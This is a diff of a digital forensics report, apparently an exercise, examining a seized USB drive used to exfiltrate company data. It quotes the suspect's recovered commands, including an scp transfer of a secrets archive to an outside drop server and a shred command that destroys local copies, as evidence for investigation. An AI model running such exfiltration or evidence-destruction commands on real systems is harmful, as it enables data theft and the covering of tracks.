@@ -10,9 +10,9 @@
 
 ## 1  Executive Summary
 
-Exhibit A is a forensic image of a USB drive seized from a departing employee suspected of exfiltrating proprietary data. The examination determined that this drive was not used as a normal work device. It was constructed from scratch on a Linux-based system and populated with fabricated contents by an automated process in under three seconds. Its visible files — documents, software installers, and photographs organized into typical workplace folders — are a deliberate facade designed to withstand only casual inspection.
+Exhibit A is a forensic image of a USB drive seized from a departing employee suspected of exfiltrating proprietary data. The examination determined that this drive was not used as a normal work device. It was constructed from scratch on a Linux-based system and populated with fabricated contents by an automated process in under three seconds. Its visible files — documents, software installers, and photographs organized into typical workplace folders — are a deliberate facade. The documents were not randomly chosen: they reference the same client project and the same employees whose confidential data was concealed elsewhere on the drive, creating a coordinated cover story designed to withstand only casual inspection.
 
-Concealed within a hidden storage region preceding the visible drive contents, the examination recovered the complete operational record of the employee's activities. A preserved command history documents the full sequence of the operation: the employee cracked organizational passwords from a stolen authentication database, scanned the internal network for accessible services, packaged confidential data into an encrypted archive, transmitted that archive to an external server at a pre-arranged drop location, and then systematically destroyed local copies of the stolen files. The final recorded action was an attempt to erase the command history itself — an attempt that failed because the history file had already been written to permanent storage.
+Concealed within a hidden storage region preceding the visible drive contents, the examination recovered the complete operational record of the employee's activities. A preserved command history documents the full sequence of the operation: the employee cracked organizational passwords from a stolen authentication database, scanned the internal network for accessible services, packaged confidential data into an encrypted archive, transmitted that archive to an external server at a pre-arranged drop location — a destination corroborated by a reference to confirming a "secure drop location" found in one of the visible documents — and then systematically destroyed local copies of the stolen files. The final recorded action was an attempt to erase the command history itself — an attempt that failed because the history file had already been written to permanent storage.
 
 The encrypted archive was recovered and successfully decrypted using a password found among the cracked credentials. It contained three files spanning the organization's most sensitive domains: a confidential client project summary bearing active system credentials and production database access details, an employee roster with full names, salaries, email addresses, and partial Social Security numbers, and a file of internal infrastructure passwords for VPN access, code repositories, and cloud services. The infrastructure password file carried the header "Do not store on portable media" — an organizational policy the employee explicitly violated.
 
@@ -20,7 +20,7 @@ The employee employed multiple concealment techniques throughout the operation: 
 
 ### Recommended Immediate Actions
 
-Based on the findings documented in this report, three actions are recommended. First, all credentials recovered from the archive should be treated as compromised: passwords for VPN, GitLab, Jira, AWS, and the production database should be rotated immediately, and the exposed API token should be revoked. Second, the destination IP address used for the data transfer should be investigated to determine who controls that infrastructure and whether the transmitted data has been further disseminated. Third, the organization's network access logs should be reviewed for the period preceding the drive's seizure to determine the full scope of the employee's reconnaissance and access activity, as the command history suggests network scanning that may have touched systems beyond those documented on the drive.
+Based on the findings documented in this report, three actions are recommended. First, all credentials recovered from the archive should be treated as compromised: passwords for VPN, GitLab, Jira, AWS, and the production database should be rotated immediately, and the exposed API token should be revoked. Second, the destination IP address used for the data transfer should be investigated to determine who controls that and whether or not the transmitted data has been further disseminated to unauthorized third parties. Third, this organization's network access logs should be reviewed for the time period preceding the drive's seizure, to determine the entire scope of the employee's reconnaissance activity, since the command history suggests some network scanning occurred that may have touched systems beyond those explicitly documented on the exhibit drive.
 
 The following sections document the technical examination of Exhibit A.
 
@@ -170,7 +170,7 @@ The fifth command performs a network scan of the entire 192.168.1.0/24 subnet �
 **Command 6 — Exfiltration:**  
 `scp -i ~/.ssh/id_rsa secrets.zip deploy@203.0.113.47:/var/drop/`
 
-The sixth command is the exfiltration itself. The suspect used `scp` — secure copy over SSH — to transmit the encrypted archive to an external server at IP address 203.0.113.47. Authentication was performed using a private SSH key (`~/.ssh/id_rsa`) rather than a password, indicating the suspect had pre-configured key-based access to the destination. The remote username `deploy` and the destination path `/var/drop/` suggest pre-arranged receiving infrastructure — a purpose-built drop point, not an ad-hoc transfer to a personal device. This is the command that confirms data left the organization's control.
+The sixth command is the exfiltration itself. The suspect used `scp` — secure copy over SSH — to transmit the encrypted archive to an external server at IP address 203.0.113.47. Authentication was performed using a private SSH key (`~/.ssh/id_rsa`) rather than a password, indicating the suspect had pre-configured key-based access to the destination. The remote username `deploy` and the destination path `/var/drop/` suggest pre-arranged receiving infrastructure — a purpose-built drop point, not an ad-hoc transfer to a personal device. (Note: the address 203.0.113.47 falls within the 203.0.113.0/24 range reserved by RFC 5737 as TEST-NET-3, designated for use in documentation and examples. In a live investigation, verifying whether this address was routable at the time of the recorded transfer would be an immediate priority.) This is the command that confirms data left the organization's control.
 
 **Command 7 — Local copy destruction:**  
 `shred -vzu secrets.zip`
@@ -390,6 +390,8 @@ Their presence on a drive that documents an `scp`-based exfiltration operation (
 
 As noted in §4.2, neither file carries a `Zone.Identifier` Alternate Data Stream, confirming they were not downloaded through a browser on this volume.
 
+Verification of these executables against official distribution hashes was not performed. The specific version of each binary cannot be reliably determined from the file alone, and confirming authenticity would require matching each file against known-good hashes for the exact release in question. On a drive where every other file was demonstrably manufactured by automated tooling, the provenance of these executables — whether they are genuine copies or modified versions — remains an open question that further investigation could resolve.
+
 ### 5.7  Document Content Analysis
 
 The remaining OOXML files — `Q3_review.docx`, `team_contacts.xlsx`, and `meeting_notes.docx` — were unpacked and their internal XML examined for both document content and authoring metadata. Together with the `quarterly_report.pdf` analysis in §5.2, they reveal that every document on this drive was programmatically generated and that their contents repeatedly reference the same entities found in the hidden FAT12 evidence.
@@ -406,9 +408,15 @@ The attendee "S. Chen (Meridian FG)" ties directly to `project_alpha.txt` in the
 
 **Q3_review.docx — Internal Financial Data**
 
+Reference: `evidence/ntfs/Q3_review.docx`
+SHA-256: `b8338f1605a4eda9ac444786e027e9931fdf4e5cdcf066a02cd1508af6b64548`
+
 Internal metadata is again identical: `python-docx` creator, default template timestamps, revision 1. The document is titled "Q3 Financial Review — INTERNAL" and contains a financial summary table reporting actual revenue of $4.19M against projected $4.02M, along with expense and net income figures. Its action items section includes "Schedule client review calls — Project Alpha and Project Bravo." This is the third independent reference to Project Alpha across the drive (after `project_alpha.txt` in the encrypted archive and `meeting_notes.docx`), establishing that the NTFS surface documents were not randomly selected cover files but were thematically coordinated with the exfiltration payload.
 
 **team_contacts.xlsx — A Different Tool, the Same Session**
+
+Reference: `evidence/ntfs/team_contacts.xlsx`
+SHA-256: `bc8c3600cda84106613773b69eda1f77742964a8f8e728fa5ba5131299062ed9`
 
 Unlike the three Word documents, the spreadsheet's `docProps/core.xml` identifies its creator as `openpyxl` — a Python library for generating Excel files. Critically, `openpyxl` does not inject the 2013-era template timestamps that `python-docx` does. Its creation and modification timestamps read `2026-03-16T14:41:17Z` — the actual creation time: March 16, 2026 at 09:41 CDT. This independently corroborates the timeline established by the NTFS FN timestamps and the `quarterly_report.pdf` internal OOXML timestamps, all pointing to the same preparation session on March 16.
 
@@ -682,7 +690,7 @@ All tool outputs referenced in this report are stored in the `logs/` directory:
 | deleted_files.txt | Deleted file listing from `fls -d` | §5.4, §6.1 |
 | istat_all.txt | `istat` output for all user files (MFT 67–75) | §5.2–§5.8 |
 | istat_orphans.txt | `istat` output for orphan entries (MFT 16–23) | §6.1 |
-| hash_manifest.txt | Initial evidence file hashes | §2.1, §5.1 |
+| hash_manifest.txt | Initial evidence file hashes | §5.1 |
 | final_hash_manifest.txt | Final comprehensive hash manifest | §8.2 |
 | bulk_extractor_run.txt | bulk_extractor scan log | §7.1 |
 | be_report.xml | bulk_extractor DFXML provenance record | §7.1 |
